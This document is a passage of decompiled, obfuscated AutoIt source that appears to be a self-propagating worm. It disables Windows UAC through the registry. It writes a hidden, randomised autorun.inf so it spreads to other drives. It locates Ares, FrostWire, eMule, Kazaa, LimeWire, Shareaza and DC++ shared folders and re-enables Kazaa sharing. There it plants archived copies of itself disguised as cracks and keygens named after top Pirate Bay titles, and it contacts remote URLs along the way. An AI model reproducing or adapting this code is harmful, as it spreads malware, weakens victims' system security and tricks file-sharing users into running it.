	$Var02EB = StringRegExp($Var029F, "pOjjcASCSC5SC4sc4b", 0)
	$Var02EC = StringRegExp($Var029F, "SjJA54ASD8646A2Sdsasd1ASDsb", 0)
	$Var02ED = StringRegExp($Var029F, "Q7A4Z1W8S5X2E8D5C2R8F5V2", 0)
	$Var02EE = StringRegExp($Var029F, "7Q5S3V9T5D1ZS464DFDSDF", 0)
	$Var029E = StringRegExp($Var029F, "H4D8D5U96581H3Y321VBNM1M1MBN", 0)
	$Var02EF = StringRegExp($Var029F, "I9O87PKL654M3B32M9Z5XC1", 0)
	$Var02F0 = StringRegExp($Var029F, "7w7wq8T977T7TU9I7O3UI4P4IU", 0)
	$Var02F1 = StringRegExp($Var029F, "Q9V7U2s4U9m1H5A6T7K5T4c15Wf9D5", 0)
	$Var02F2 = StringRegExp($Var029F, "llllsjknaKHjiBIUBikbiybIKLyilUGugLgil", 0)
	$Var02B0 = StringRegExp($Var029F, "llLLLGS436QWE6ZC654E6546FFSS9d8h7t", 0)
	$Var02F3 = StringRegExp($Var029F, "FAq9PKZr3vC6sdS4FJ8ker64V1Edf6DS54Fa6G4Kgg5Dr25", 0)
	$Var02F4 = StringRegExp($Var029F, "Ki8sdtPm4sQN1g2SBs321PTO4wVeU5", 0)
	$Var02F5 = StringRegExp($Var029F, "9df51gftr1h19gh650gh5j6046j540fof0o4yu540f", 0)
	$Var02F6 = StringRegExp($Var029F, "981NTY81KL1DF36DRG684F0080H94ERG498NMJ4SY9", 0)
	$Var02F7 = StringRegExp($Var029F, "j6g54s6545L1H93JL57FG657H1", 0)
	$Var02F9 = StringRegExp($Var029F, "aoksndoknhd6f14e635136d51v6b5n1g61", 0)
	$Var02F8 = StringRegExp($Var029F, "FHKJA6518GSEJdhjh65hhg4HTaekjb4hn6y1kkkjhj", 0)
	$Var02FA = StringRegExp($Var029F, "P4A9uK3i6I4V2V2VB1JH6jjjkk", 0)
	$Var02FB = StringRegExp($Var029F, "9a5sd19a5s1d3g5h7j", 0)
	$Var02FD = StringRegExp($Var029F, "C94D5DCB5FA4E879A1D216A4VD4S98RE8", 0)
	$Var02FE = StringRegExp($Var029F, "9sd8f41q9w8ep1j87g3h52nb", 0)
	$Var02FF = StringRegExp($Var029F, "98uknm87l9p87zzx11v2d", 0)
	$Var0300 = StringRegExp($Var029F, "m9k5o1z7a5q3", 0)
EndFunc

Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
	$Var044E = 0
	If RegRead($Arg02, $Arg03) <> "" Then
		$Var03D2 = Fn00A8(0, RegRead($Arg02, $Arg03), $Arg04, 4)
	Else
		$Var03D2 = Fn009B($Arg00)
		If @error = 1 Then
			$Var044E = 1
		Else
			$Var044F = StringSplit($Var03D2, ";")
			If $Var044F[0] = 4 Then
				If StringLen($Var044F[2]) = 2 Then
					$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Fn00A8(1, $Var03D2, $Arg04, 4))
				EndIf
			Else
				$Var03D2 = "-1"
				$Var044E = 1
			EndIf
		EndIf
		Sleep(0x2710)
		If $Var044E = 1 Then
			$Var03D2 = Fn009B($Arg01)
			If @error = 1 Then
				$Var044E = 1
			Else
				$Var044F = StringSplit($Var03D2, ";")
				If $Var044F[0] = 4 Or $Var044F[0] = 2 Then
					If StringLen($Var044F[2]) = 2 Then
						$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Fn00A8(1, $Var03D2, $Arg04, 4))
					EndIf
				Else
					$Var03D2 = "-1"
				EndIf
			EndIf
		EndIf
	EndIf
	Return $Var03D2
EndFunc

Func Fn00B8()
	If $Var02DE = 1 Then
		$Var036F = StringRegExp($Var029F, "Yz00yzlslnnnlsd654fSDF5654SB", 0)
		$Var0370 = StringRegExp($Var029F, "Yz1slnnnlsd654fSDF5654S", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "Yz00yzlslnnnlsd654fSDF5654SB"
			$Var0372 = "Yz1slnnnlsd654fSDF5654S"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03F8 = StringSplit($Var02C6, "~")
			If $Var03F8[0] = 9 Then
				$Var0330 = $Var03F8[1]
				$Var0331 = $Var03F8[2]
				$Var0332 = $Var03F8[3]
				$Var0333 = $Var03F8[4]
				$Var0334 = $Var03F8[5]
				$Var0335 = $Var03F8[6]
				$Var0336 = $Var03F8[7]
				$Var0337 = $Var03F8[8]
				$Var0338 = $Var03F8[9]
			EndIf
			If $Var03F8[0] = 2 Then
				$Var0334 = $Var03F8[1]
				$Var0335 = $Var03F8[2]
			EndIf
			If $Var03F8[0] = 4 Then
				$Var0339 = $Var03F8[1]
				$Var033A = $Var03F8[2]
				$Var033B = $Var03F8[3]
				$Var033C = $Var03F8[4]
			EndIf
			If $Var03F8[0] = 3 Then
				$Var033D = $Var03F8[1]
				$Var033E = $Var03F8[2]
			EndIf
			If $Var03F8[0] = 8 Then
				$Var0334 = $Var03F8[1]
				$Var0335 = $Var03F8[2]
				$Var0339 = $Var03F8[3]
				$Var033A = $Var03F8[4]
				$Var033B = $Var03F8[5]
				$Var033C = $Var03F8[6]
				$Var033D = $Var03F8[7]
				$Var033E = $Var03F8[8]
			EndIf
			If $Var03F8[0] = 0x000F Then
				$Var0330 = $Var03F8[1]
				$Var0331 = $Var03F8[2]
				$Var0332 = $Var03F8[3]
				$Var0333 = $Var03F8[4]
				$Var0334 = $Var03F8[5]
				$Var0335 = $Var03F8[6]
				$Var0336 = $Var03F8[7]
				$Var0337 = $Var03F8[8]
				$Var0338 = $Var03F8[9]
				$Var0339 = $Var03F8[10]
				$Var033A = $Var03F8[0x000B]
				$Var033B = $Var03F8[0x000C]
				$Var033C = $Var03F8[0x000D]
				$Var033D = $Var03F8[0x000E]
				$Var033E = $Var03F8[0x000F]
			EndIf
		EndIf
	EndIf
EndFunc

Func Fn00B9($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, $Arg06, $Arg07)
	$Var0450 = $Arg00
	$Var0451 = StringInStr($Var0450, "/", 0, 3)
	$Var0452 = StringMid($Var0450, 1, $Var0451 - 1)
	$Var0453 = StringMid($Var0450, $Var0451)
	$Var0402 = Random(2, 8, 1)
	Select
		Case $Var0402 = 2
			$Var0454 = ":" & $Arg01
		Case $Var0402 = 3
			$Var0454 = ":" & $Arg02
		Case $Var0402 = 4
			$Var0454 = ":" & $Arg03
		Case $Var0402 = 5
			$Var0454 = ":" & $Arg04
		Case $Var0402 = 6
			$Var0454 = ":" & $Arg05
		Case $Var0402 = 7
			$Var0454 = ":" & $Arg06
		Case $Var0402 = 8
			$Var0454 = ":" & $Arg07
	EndSelect
	$Var0455 = $Var0452 & $Var0454 & $Var0453
	Return $Var0455
EndFunc

Func Fn00BA($Arg00)
	$Var0456 = ""
	$Var0457 = ""
	$Var0458 = 0
	While 1
		$Var038B = Random(1, 4, 1)
		Select
			Case $Var038B = 1
				$Var0457 = Chr(Random(Asc("A"), Asc("Z"), 1))
			Case $Var038B = 2
				$Var0457 = Chr(Random(Asc("a"), Asc("z"), 1))
			Case $Var038B = 3
				$Var0457 = Random(0, 9, 1)
			Case $Var038B = 4
				$Var0457 = Random(0, 9, 1)
		EndSelect
		$Var0458 = $Var0458 + 1
		If $Var0458 = $Arg00 Then ExitLoop
		$Var0456 = $Var0456 & $Var0457
	WEnd
	Return $Var0456
EndFunc

Func Fn00BB($Arg00, $Arg01, $Arg02, $Arg03, $ArgOpt04 = "", $ArgOpt05 = "")
	$Var0459 = ""
	$Var045A = ""
	$Var045B = ""
	$Var045C = 1 + 3
	$Var045A &= "open=" & $Arg01 & "shell\open\Command=" & $Arg01 & "shell\open\Default=1"
	If $ArgOpt04 = "rem" Then
		$Var045C += 2
		$Var045A &= "Icon=%system%\shell32.dll,7UseAutoPlay=1"
		$Var045D = "autorun.i"
	Else
		$Var045D = "autorun.in"
	EndIf
	If $ArgOpt05 <> "" Then
		$Var045C += 2
		$Var045A &= "action=action="
	EndIf
	$Var045A = Fn00BC($Var045A)
	$Var045E = Random(1, 0x001E, 1)
	For $Var0402 = 1 To $Var045E
		$Var0459 = $Var0459 & Fn00BD() & ""
	Next
	$Var045F = StringTrimRight($Var045A & $Var0459, 1)
	$Var045F = StringSplit($Var045F, "")
	For $Var0402 = 1 To $Var045E * 3
		$Var0460 = Random(1, $Var045F[0], 1)
		$Var0461 = Random(1, $Var045F[0], 1)
		Fn0093($Var045F[$Var0460], $Var045F[$Var0461])
	Next
	$Var0462 = Random(1, 6, 1)
	For $Var0402 = 1 To $Var0462
		$Var045B = $Var045B & Fn00BD() & @CRLF
	Next
	$Var045B = $Var045B & Fn00BC("[AutoRun]") & @CRLF
	$Var0462 += 1
	$Var0463 = UBound($Var045F)
	If $Var0463 + $Var0462 <= 8 Then
		Do
			$Var0464 = Fn0091($Var045F, Fn00BD())
			$Var0463 += 1
			$Var045F[0] += 1
		Until $Var0464 = 8
	EndIf
	Fn0092($Var045F, 9 - $Var0462, ";" & Fn00A8(1, $Arg02 & "!" & $Arg01, $Arg03, 1))
	$Var0465 = Fn0094($Var045F, @CRLF, 1)
	If $ArgOpt05 <> "" Then
		$Var0466 = StringInStr($Var0465, "", 0, 1)
		$Var0465 = Fn0097($Var0465, $ArgOpt05, $Var0466)
		$Var0467 = StringInStr($Var0465, "", 0, 2)
		$Var0465 = Fn0097($Var0465, " @" & $Arg01, $Var0467)
		$Var0465 = StringReplace($Var0465, "", "")
	EndIf
	$Var045B &= $Var0465
	If FileExists($Arg00 & "/" & $Var045D) Then
		FileSetAttrib($Arg00 & "/" & $Var045D, "-RASHNOT")
		FileDelete($Arg00 & "/" & $Var045D)
		Sleep(10)
	EndIf
	$Var0468 = FileOpen($Arg00 & "/" & $Var045D, 1)
	FileWrite($Var0468, $Var045B)
	FileClose($Var0468)
	FileSetAttrib($Arg00 & "/" & $Var045D, "+RASHNOT")
EndFunc

Func Fn00BC($Arg00)
	$Arg00 = StringSplit($Arg00, "")
	$Var0456 = ""
	For $Var0469 = 1 To $Arg00[0]
		$Var046A = Random(1, 2, 1)
		If $Var046A = 1 Then
			$Arg00[$Var0469] = StringUpper($Arg00[$Var0469])
		Else
			$Arg00[$Var0469] = StringLower($Arg00[$Var0469])
		EndIf
		$Var0456 &= $Arg00[$Var0469]
	Next
	Return $Var0456
EndFunc

Func Fn00BD()
	$Var046B = ""
	$Var046C = Random(1, 0x0050, 1)
	For $Var046D = 1 To $Var046C
		If Random() < 0.5 Then
			$Var046E = Chr(Random(Asc("A"), Asc("Z"), 1))
		Else
			$Var046E = Chr(Random(Asc("0"), Asc("9"), 1))
		EndIf
		$Var046B = $Var046B & $Var046E
		If $Var046D = 0x0064 Then ExitLoop
	Next
	Return ";" & $Var046B
EndFunc

Func Fn00BE()
	$Var036C = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	$Var036D = "EnableLUA"
	$Var046F = "REG_DWORD"
	$Var0470 = "0"
	$Var0471 = RegRead($Var036C, $Var036D)
	If $Var0471 = 1 Then
		RegWrite($Var036C, $Var036D, $Var046F, $Var0470)
	EndIf
EndFunc

Func Fn00BF($Arg00)
	Fn00B4()
	If $Var0320 = "Si" Then
		$Var031C = Fn00E0()
		If $Arg00 = 1 Then
			$Var0304 = Fn00DA()
		Else
			$Var0304 = Fn00E3()
		EndIf
		If $Var031D = "" Then
			$Var0472 = "OkiDoki"
		EndIf
		If $Var031D <> "" Then
			$Var032E = @SystemDir & "\" & $Var031E
			FileDelete($Var032E)
			Fn00E2($Var031D)
			Sleep(0x3A98)
			$Var0473 = FileGetSize($Var032E)
			If $Var0473 <> $Var031F Then
				$Var0472 = "Error"
				FileDelete($Var032E)
			EndIf
			If $Var0473 = $Var031F Then
				$Var0472 = "OkiDoki"
				$Var0302 = @SystemDir & "\" & $Var031E
			EndIf
		EndIf
		Fn00B4()
		If $Var0472 = "OkiDoki" Then
			Fn00C0()
			Fn00C4()
			Fn00C8()
			Fn00CC()
			Fn00CF()
			Fn00D2()
			Fn00D5()
			FileDelete($Var031A)
			FileDelete($Var032E)
			FileDelete(@SystemDir & "\" & $Var031E)
			DirRemove(@HomeDrive & "\" & $Var0317 & "\", 1)
			DirRemove(@HomeDrive & "\" & $Var0316 & "\", 1)
		EndIf
	EndIf
EndFunc

Func Fn00C0()
	$Var0474 = Fn00C1()
	If $Var0474 = "Yes" Then
		$Var0309 = Fn00C2()
		Fn00C3()
	EndIf
EndFunc

Func Fn00C1()
	$Var0475 = RegRead("HKCU\Software\Ares", "General.Language")
	If @error Then
		$Var0476 = "No"
		Return $Var0476
	Else
		$Var0476 = "Yes"
		Return $Var0476
	EndIf
EndFunc

Func Fn00C2()
	$Var030A = RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Local AppData")
	$Var0477 = $Var030A & "\Ares\My Shared Folder\"
	$Var030B = RegRead("HKCU\Software\Ares", "Download.Folder")
	If $Var030B <> "" Then
		$Var0478 = Fn0095($Var030B)
		$Var030B = Fn00DF($Var0478)
		Return $Var030B
	EndIf
	If $Var030B = "ErrorPath" Or $Var030B = "" Then
		$Var031B = Fn00DF($Var0477)
		Return $Var031B
	EndIf
EndFunc

Func Fn00C3()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			Sleep(0x0064)
			If FileExists($Var030A & "\Ares\Data\Shared Folders.txt") Then
				$Var047A = FileOpen($Var030A & "\Ares\Data\Shared Folders.txt", 0)
				While 1
					$Var047B = FileReadLine($Var047A)
					If @error = -1 Then ExitLoop
					$Var047C = Fn00D8($Var047B, $Var0319 & $Var0304[$Var0303] & $Var0479, $Var047B & "\" & $Var0304[$Var0303] & $Var0479, 0)
				WEnd
				FileClose($Var047A)
			EndIf
			If $Var031B <> "" Then
				$Var047C = Fn00D8($Var031B, $Var0319 & $Var0304[$Var0303] & $Var0479, $Var031B & "\" & $Var0304[$Var0303] & $Var0479, 0)
			EndIf
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var0327)
	EndIf
EndFunc

Func Fn00C4()
	$Var047D = Fn00C5()
	If $Var047D = "Yes" Then
		$Var047E = Fn00C6()
		$Var0312 = StringSplit($Var047E, "|||")
		$Var0313 = StringSplit($Var030C, ";")
		Fn00C7()
	EndIf
EndFunc

Func Fn00C5()
	$Var047F = RegRead("HKLM\SOFTWARE\FrostWire\command\", "")
	If @error Then
		$Var0480 = "No"
		Return $Var0480
	Else
		$Var0480 = "Yes"
		Return $Var0480
	EndIf
EndFunc

Func Fn00C6()
	$Var0481 = RegRead("HKLM\SOFTWARE\FrostWire\command\", "")
	$Var0482 = @AppDataDir & "\FrostWire\frostwire.props"
	$Var0483 = FileReadLine($Var0482, 1)
	If $Var0483 = "[FrostWire]" Or $Var0483 = "[FrostWire]=" Then
		$Var0483 = "#FrostWire properties file"
	EndIf
	Fn0099($Var0482, 1, "[FrostWire]", 1)
	$Var0484 = IniRead($Var0482, "FrostWire", "DIRECTORY_FOR_SAVING_FILES", "ERROR_DIRECTORY_FOR_SAVING_FILES")
	$Var030C = IniRead($Var0482, "FrostWire", "DIRECTORIES_TO_SEARCH_FOR_FILES", "ERROR_DIRECTORIES_TO_SEARCH_FOR_FILES")
	Fn0099($Var0482, 1, $Var0483, 1)
	$Var0484 = StringReplace($Var0484, "\\", "\")
	$Var0484 = StringReplace($Var0484, "\:", ":")
	$Var0484 = Fn00DF($Var0484)
	$Var030C = StringReplace($Var030C, "\\", "\")
	$Var030C = StringReplace($Var030C, "\:", ":")
	$Var030C = Fn00DF($Var030C)
	Return $Var0484 & "|||" & $Var030C
EndFunc

Func Fn00C7()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			Sleep(0x0064)
			If IsArray($Var0312) Then
				If $Var0312[1] <> "" Or $Var0312[1] <> "ERROR_DIRECTORY_FOR_SAVING_FILES" Then
					$Var047C = Fn00D8($Var0312[1], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var0312[1] & "\" & $Var0304[$Var0303] & $Var0479, 0)
				EndIf
			EndIf
			If IsArray($Var0313) Then
				If $Var0313[1] <> "ERROR_DIRECTORIES_TO_SEARCH_FOR_FILES" Or $Var0313[1] <> "" Then
					For $Var0485 = 1 To $Var0313[0]
						$Var047C = Fn00D8($Var0313[$Var0485], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var0313[$Var0485] & "\" & $Var0304[$Var0303] & $Var0479, 0)
					Next
				EndIf
			EndIf
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var0328)
	EndIf
EndFunc

Func Fn00C8()
	$Var0486 = Fn00C9()
	If $Var0486 = "Yes" Then
		$Var0314 = Fn00CA()
		$Var0314 = StringSplit($Var0314, "|||")
		Fn00CB()
	EndIf
EndFunc

Func Fn00C9()
	$Var030D = RegRead("HKCU\Software\eMule\", "Install Path")
	If @error Then
		$Var0487 = "No"
		Return $Var0487
	Else
		$Var0487 = "Yes"
	EndIf
	Return $Var0487
EndFunc

Func Fn00CA()
	$Var0488 = $Var030D & "\config\preferences.ini"
	$Var0489 = $Var030D & "\config\shareddir.dat"
	If FileExists($Var0488) Then
		$Var048A = IniRead($Var0488, "eMule", "IncomingDir", "Error Emule Preferences")
		$Var048A = Fn00DF($Var048A)
	EndIf
	If $Var048A = "Error Emule Preferences" Then
		$Var048A = $Var030D & "\Incoming\"
	EndIf
	If FileExists($Var0489) Then
		$Var048B = FileOpen($Var0489, 0)
		$Var048C = ""
		While 1
			$Var047B = FileReadLine($Var048B)
			If @error = -1 Then ExitLoop
			$Var048C = $Var048C & "|||" & $Var047B
		WEnd
		FileClose($Var0489)
	EndIf
	If FileExists($Var0489) Then
		Return $Var048A & $Var048C
	Else
		Return $Var048A
	EndIf
EndFunc

Func Fn00CB()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			If IsArray($Var0314) Then
				For $Var0485 = 1 To $Var0314[0]
					$Var047C = Fn00D8($Var0314[$Var0485], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var0314[$Var0485] & "\" & $Var0304[$Var0303] & $Var0479, 0)
				Next
			EndIf
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var0329)
	EndIf
EndFunc

Func Fn00CC()
	$Var048D = RegRead("HKCU\Software\Kazaa\LocalContent\", "DownloadDir")
	If @error Then
		$Var048E = "No"
		Return $Var048E
	Else
		$Var048E = "Yes"
		$Var048F = Fn00CD()
		$Var030E = StringSplit($Var048F, "|")
		Fn00CE()
	EndIf
	Return $Var048E
EndFunc

Func Fn00CD()
	$Var0490 = RegRead("HKCU\Software\Kazaa\LocalContent\", "DisableSharing")
	If $Var0490 <> 0 Then
		RegWrite("HKCU\Software\Kazaa\LocalContent\", "DisableSharing", "REG_DWORD", "0")
	EndIf
	$Var0491 = RegRead("HKCU\Software\Kazaa\LocalContent\", "DownloadDir")
	$Var0492 = "No"
	$Var0493 = ""
	For $Var0350 = 1 To 0x0064
		$Var043A = RegEnumVal("HKCU\Software\Kazaa\LocalContent\", $Var0350)
		If @error <> 0 Then ExitLoop
		$Var0494 = RegRead("HKCU\Software\Kazaa\LocalContent\", $Var043A)
		If StringInStr($Var043A, "Dir") And Not StringInStr($Var043A, "DownloadDir") Then
			$Var0494 = StringReplace($Var0494, "012345:", "")
			$Var0493 = $Var0494 & "|" & $Var0493
			$Var0492 = "Ok"
		EndIf
	Next
	If $Var0492 = "Ok" Then
		$Var0495 = StringSplit($Var0493, "|")
		Return $Var0491 & "|" & $Var0493
	Else
		Return $Var0491
	EndIf
EndFunc

Func Fn00CE()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			If IsArray($Var030E) Then
				For $Var0485 = 1 To $Var030E[0]
					$Var047C = Fn00D8($Var030E[$Var0485], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var030E[$Var0485] & "\" & $Var0304[$Var0303] & $Var0479, 0)
				Next
			EndIf
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var032A)
	EndIf
EndFunc

Func Fn00CF()
	$Var0496 = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\LimeWire", "InstallDir")
	If @error Then
		$Var0497 = "No"
		Return $Var0497
	Else
		$Var0497 = "Yes"
		$Var0498 = Fn00D0()
	EndIf
	If $Var0498 <> "ERROR DIRECTORY_FOR_SAVING_FILES" Or $Var0498 <> "" Then
		Fn00D1()
	EndIf
	Return $Var0497
EndFunc

Func Fn00D0()
	$Var0499 = @AppDataDir & "\LimeWire\Limewire.props"
	If FileExists($Var0499) Then
		$Var0483 = FileReadLine($Var0499, 1)
	EndIf
	If $Var0483 = "[LimeWire]" Or $Var0483 = "[LimeWire]=" Then
		$Var0483 = "#LimeWire properties file"
	EndIf
	Fn0099($Var0499, 1, "[LimeWire]", 1)
	$Var030F = IniRead($Var0499, "LimeWire", "DIRECTORY_FOR_SAVING_FILES", "ERROR DIRECTORY_FOR_SAVING_FILES")
	$Var030F = StringReplace($Var030F, "\\", "\")
	$Var030F = StringReplace($Var030F, "\:", ":")
	Fn0099($Var0499, 1, $Var0483, 1)
	Return $Var030F
EndFunc

Func Fn00D1()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			$Var047C = Fn00D8($Var030F, $Var0319 & $Var0304[$Var0303] & $Var0479, $Var030F & "\" & $Var0304[$Var0303] & $Var0479, 0)
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var032B)
	EndIf
EndFunc

Func Fn00D2()
	$Var049A = RegRead("HKCU\Software\Shareaza\Shareaza\", "Path")
	If @error Then
		$Var049B = "No"
		Return $Var049B
	Else
		$Var049B = "Yes"
		$Var0310 = Fn00D3()
		$Var0310 = StringSplit($Var0310, "|")
		Fn00D4()
	EndIf
	Return $Var049B
EndFunc

Func Fn00D3()
	$Var049C = RegRead("HKCU\Software\Shareaza\Shareaza\Downloads\", "CompletePath")
	If @error Then
		$Var049C = "NULL"
	EndIf
	$Var049D = RegRead("HKCU\Software\Shareaza\Shareaza\Downloads\", "CollectionPath")
	If @error Then
		$Var049D = "NULL"
	EndIf
	$Var049E = RegRead("HKCU\Software\Shareaza\Shareaza\Downloads\", "TorrentPath")
	If @error Then
		$Var049E = "NULL"
	EndIf
	Return $Var049C & "|" & $Var049D & "|" & $Var049E
EndFunc

Func Fn00D4()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			Sleep(0x0064)
			If IsArray($Var0310) Then
				For $Var049F = 1 To $Var0310[0]
					If $Var0310[$Var049F] <> "NULL" Then
						$Var047C = Fn00D8($Var0310[$Var049F], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var0310[$Var049F] & "\" & $Var0304[$Var0303] & $Var0479, 0)
					EndIf
				Next
			EndIf
			Fn00DE($Var0304[$Var0303] & $Var0479)
		Next
	EndIf
	If $Var0324 <> "" Then
		Fn009B($Var0324 & $Var032C)
	EndIf
EndFunc

Func Fn00D5()
	$Var04A0 = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\DC++\", "Install_Dir")
	If @error Then
		$Var04A1 = "No"
		Return $Var04A1
	Else
		$Var04A1 = "Yes"
		$Var0315 = Fn00D6()
		Fn00D7()
	EndIf
	Return $Var04A1
EndFunc

Func Fn00D6()
	$Var04A2 = @AppDataDir & "\DC++\DCPlusPlus.xml"
	If FileExists($Var04A2) Then
		$Var048B = FileOpen($Var04A2, 0)
		$Var04A3 = ""
		While 1
			$Var047B = FileReadLine($Var048B)
			If @error = -1 Then ExitLoop
			If StringInStr($Var047B, "<Directory Virtual=") Then
				$Var04A4 = Fn0096($Var047B, "<Directory Virtual=""", "</Directory>")
				$Var04A5 = Fn0096($Var04A4[0], """>", ":\")
				$Var04A6 = Fn0096($Var047B, $Var04A5[0] & ":\", "</Directory>")
				$Var04A7 = $Var04A5[0] & ":\" & $Var04A6[0]
				$Var04A3 = $Var04A3 & "|" & $Var04A7
			EndIf
		WEnd
		FileClose($Var04A2)
	EndIf
	If $Var04A3 = "" Then
		Return "Vacio"
	Else
		Return $Var04A3
	EndIf
EndFunc

Func Fn00D7()
	If $Var031C <> "ERROR-2-SITES" Then
		For $Var0303 = 1 To $Var0304[0]
			$Var0479 = Fn00D9($Var0304[$Var0303])
			Sleep(0x0064)
			If $Var0315 <> "Vacio" Then
				$Var04A8 = StringSplit($Var0315, "|")
				If IsArray($Var04A8) Then
					For $Var04A9 = 1 To $Var04A8[0]
						$Var047C = Fn00D8($Var04A8[$Var04A9], $Var0319 & $Var0304[$Var0303] & $Var0479, $Var04A8[$Var04A9] & "\" & $Var0304[$Var0303] & $Var0479, 0)
					Next
				EndIf
				Fn00DE($Var0304[$Var0303] & $Var0479)
			EndIf
		Next
	EndIf
	Fn009B($Var032D)
EndFunc

Func Fn00D8($Arg00, $Arg01, $Arg02, $Arg03)
	Select
		Case $Var031C = "Winrar"
			$Var04AA = ".rar"
		Case $Var031C = "7za"
			$Var04AA = ".zip"
	EndSelect
	$Var0479 = Fn00D9($Var0304[$Var0303])
	$Var04AB = StringLeft($Arg02, 3)
	$Var04AC = DriveSpaceFree($Var04AB)
	$Var04AD = Int($Var04AC)
	If $Var04AD <= 0x0BB8 Then
		Return "FuckSpace"
	EndIf
	If Not $Arg00 = "" And Not FileExists($Arg02 & $Var04AA) Then
		DirCreate($Arg00)
		$Arg02 = StringReplace($Arg02, "\\", "\")
		$Arg02 = Fn00DF($Arg02)
		$Arg01 = StringReplace($Arg01, "\\", "\")
		$Arg01 = Fn00DF($Arg01)
		FileCopy($Arg01 & $Var04AA, $Arg02 & $Var04AA, $Arg03)
		Sleep(0x07D0)
		Return "Done"
	Else
		Return "FUCK"
	EndIf
EndFunc

Func Fn00D9($Arg00)
	$Var04AE = 0
	$Var04AF = ".Crack~.Activator~.Keygen~.Validator~-Razor1911~-RELOADED~-KeyMaker"
	$Var04AF = StringSplit($Var04AF, "~")
	$Var04B0 = Random(1, $Var04AF[0], 1)
	If Not StringInStr($Arg00, "Crack") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "Activat") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "Keygen") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "Validat") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "Razor1911") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "RELOADED") Then $Var04AE = $Var04AE + 1
	If Not StringInStr($Arg00, "KeyMaker") Then $Var04AE = $Var04AE + 1
	If $Var04AE = 7 Then
		$Arg00 = $Arg00 & $Var04AF[$Var04B0]
	EndIf
	DirCreate($Var0319)
	FileCopy($Var0302, $Var031A)
	$Var04B1 = $Var0319 & Random(0x006F, 0x3B9AC9FF, 1) & ".exe"
	$Var04B2 = $Var0319 & "Readme.txt"
	Fn0098($Var04B1)
	Fn0098($Var04B2)
	Sleep(0x0064)
	$Var04B3 = FileOpen($Var04B1, 2)
	$Var04B4 = FileOpen($Var04B2, 2)
	FileWriteLine($Var04B3, $Var04B2 & @CRLF)
	FileWriteLine($Var04B3, $Var0319 & $Arg00 & ".exe" & @CRLF)
	FileWriteLine($Var04B4, $Arg00 & @CRLF)
	FileClose($Var04B3)
	FileClose($Var04B4)
	FileCopy($Var031A, $Var0319 & $Arg00 & ".exe", 1)
	Sleep(0x03E8)
	If $Var031C = "Winrar" Then
		If Not FileExists($Var0304[$Var0303] & ".rar") Then
			Run($Var0305 & " a -esh -ep -m5 -mt0 -r -t """ & $Var0319 & $Arg00 & ".rar" & " "" @" & $Var04B1, $Var0319, "", @SW_HIDE)
			$Var0307 = @error & " rar"
			ProcessWaitClose("RAR.exe")
		Else
			$Var0307 = "RAR-Exist"
		EndIf
	EndIf
	If $Var031C = "7za" Then
		If Not FileExists($Var0304[$Var0303] & ".zip") Then
			Run($Var0305 & " a -tzip """ & $Var0319 & $Arg00 & ".zip" & " "" @""" & $Var04B1, $Var0319, "", @SW_HIDE)
			$Var0307 = @error & " 7za"
			ProcessWaitClose($Var0311)
		Else
			$Var0307 = "7za-Exist"
		EndIf
	EndIf
	FileDelete($Var0319 & $Arg00 & ".exe")
	FileDelete($Var04B1)
	FileDelete($Var04B2)
	If $Var04AE = 7 Then
		Return $Var04AF[$Var04B0]
	Else
		Return ""
	EndIf
	Sleep(0x03E8)
EndFunc

Func Fn00DA()
	If $Var0308 = "" Then
		$Var0308 = 10
	Else
		$Var0308 = $Var0308 - 1
	EndIf
	$Var0458 = "http://torrents.thepiratebay.org"
	$Var04B5 = ".TPB.torrent"
	$Var04B6 = "/"
	$Var04B7 = "http://thepiratebay.org/top/401~http://thepiratebay.org/top/300"
	$Var04B7 = StringSplit($Var04B7, "~")
	$Var04B8 = Random(1, $Var04B7[0], 1)
	$Var04B9 = Fn009B($Var04B7[$Var04B8])
	$Var04BA = Fn0096($Var04B9, $Var0458, $Var04B5)
	Local $Local002B[1]
